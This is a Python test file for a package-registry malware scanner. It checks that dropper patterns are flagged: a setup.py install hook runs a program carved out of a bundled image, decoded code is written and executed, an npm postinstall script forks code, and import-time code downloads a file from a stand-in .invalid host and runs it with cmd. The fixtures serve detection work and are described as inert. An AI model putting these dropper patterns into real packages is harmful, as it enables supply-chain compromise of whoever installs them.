"""Registry verdicts on droppers (0.1.8): a script that writes a file and
then runs it, read on the JavaScript and Python trees (docs/RUST_ENGINE.md
§20). What the file held decides: code or a program the script decodes, a
program carved out of another file it ships (requests-darwin-lite's
shape), a script it downloads and hands an interpreter. A binary downloaded
and run is what installers do, and is left alone; cmd runs a batch file as
a script, anything else as a program.

Payloads are inert: hosts are .invalid, the encoded code prints, nothing is
extracted or executed.
"""
import base64
import json
import unittest

from tests.registry._review_support import issues, scan_npm, scan_sdist, scan_wheel

SETUP = "from setuptools import setup\nsetup(name='x')\n"
WHEEL_META = {"x-1.0.dist-info/METADATA": "Name: x\nVersion: 1.0\n"}
CODE = base64.b64encode(b"print('inert')\n").decode()


def found(res, rule):
    return sorted((i["file"], i["sev"], i["msg"]) for i in issues(res, rule))


class InstallTimeTests(unittest.TestCase):
    def test_a_program_carved_out_of_a_shipped_image(self):
        res = scan_sdist({"setup.py": (
            "import os, subprocess\nfrom setuptools.command.install import install\n"
            "class I(install):\n    def run(self):\n"
            "        with open('docs/_static/logo.png', 'rb') as fd:\n            content = fd.read()\n"
            "        with open('/tmp/go-build/output', 'wb') as fd:\n            fd.write(content[306086:])\n"
            "        os.chmod('/tmp/go-build/output', 0o755)\n"
            "        subprocess.Popen(['/tmp/go-build/output'], close_fds=True)\n" + SETUP)})
        self.assertEqual(found(res, "SC-INSTALL-HOOK"), [(
            "setup.py", "CRITICAL", "setup.py runs when pip builds or installs this sdist, and it runs a program "
                                    "it extracts from inside another file (docs/_static/logo.png).")])
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_decoded_code_written_and_run(self):
        res = scan_sdist({"setup.py": (
            "import base64, subprocess, sys\n"
            f"B = '{CODE}'\n"
            "with open('/tmp/x.py', 'w') as f:\n    f.write(base64.b64decode(B).decode())\n"
            "subprocess.Popen([sys.executable, '/tmp/x.py'])\n" + SETUP)})
        self.assertEqual(found(res, "SC-INSTALL-HOOK"), [(
            "setup.py", "CRITICAL", "setup.py runs when pip builds or installs this sdist, and it writes code it "
                                    "decodes to a file and runs it with Python.")])
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_an_npm_install_script(self):
        res = scan_npm({
            "package.json": json.dumps({"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node setup.js"}}),
            "setup.js": ("const fs = require('fs');\nconst { fork } = require('child_process');\n"
                         "const p = `${__dirname}/w.js`;\n"
                         f"fs.writeFileSync(p, Buffer.from('{CODE}', 'base64'));\nfork(p);\n")})
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        self.assertTrue(any("writes code it decodes to a file and runs it with node" in m
                            for _, _, m in found(res, "SC-INSTALL-HOOK")), found(res, "SC-INSTALL-HOOK"))

    def test_a_binary_installer_gets_no_reason_of_the_trees(self):
        # esbuild's shape: a binary downloaded, then run (`--version`). The
        # text detector's reason is as before; the trees add none.
        res = scan_sdist({"setup.py": (
            "import os, requests, subprocess\n"
            "r = requests.get('https://example.invalid/tool')\n"
            "open('bin/tool', 'wb').write(r.content)\nos.chmod('bin/tool', 0o755)\n"
            "subprocess.run(['bin/tool', '--version'])\n" + SETUP)})
        self.assertEqual(found(res, "SC-INSTALL-HOOK"), [(
            "setup.py", "CRITICAL", "setup.py runs when pip builds or installs this sdist, and it downloads a file "
                                    "and then runs it.")])


class ImportTimeTests(unittest.TestCase):
    def test_a_batch_file_downloaded_and_run_by_cmd(self):
        init = ("import urllib.request, subprocess\n"
                "urllib.request.urlretrieve('https://example.invalid/x', 'x.bat')\n"
                "subprocess.run('cmd /c x.bat', shell=True)\n")
        res = scan_wheel({"x/__init__.py": init, **WHEEL_META})
        self.assertEqual([(f, s) for f, s, _ in found(res, "SC-IMPORT-RISK")], [("x/__init__.py", "CRITICAL")])
        self.assertIn("downloads a script and runs it with cmd", found(res, "SC-IMPORT-RISK")[0][2])
        # cmd runs anything else as a program: the text detector's file downloaded and run, MAJOR
        res = scan_wheel({"x/__init__.py": init.replace("x.bat", "setup.exe"), **WHEEL_META})
        self.assertEqual([(f, s) for f, s, _ in found(res, "SC-IMPORT-RISK")], [("x/__init__.py", "MAJOR")])
        self.assertIn("downloads a file and then runs it", found(res, "SC-IMPORT-RISK")[0][2])


if __name__ == "__main__":
    unittest.main()
